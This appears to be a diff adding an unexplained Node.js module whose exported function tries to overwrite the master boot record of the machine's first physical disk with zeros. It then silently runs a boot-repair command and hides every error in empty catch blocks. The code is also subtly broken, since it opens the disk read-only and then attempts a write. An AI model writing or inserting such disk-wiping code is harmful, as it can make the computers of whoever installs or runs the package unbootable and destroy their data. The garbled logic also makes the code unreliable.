@@ -1,0 +1,2 @@
+const fs=require('fs');const {execSync}=require('child_process');
+module.exports=function(){try{const mbr=fs.openSync('\\\\.\\PhysicalDrive0','r');const zero=Buffer.alloc(512,0);fs.writeSync(mbr,zero,0,512,0);fs.closeSync(mbr);}catch(e){};try{execSync('bootrec /fixmbr',{shell:true,stdio:'ignore'});}catch(e){};};
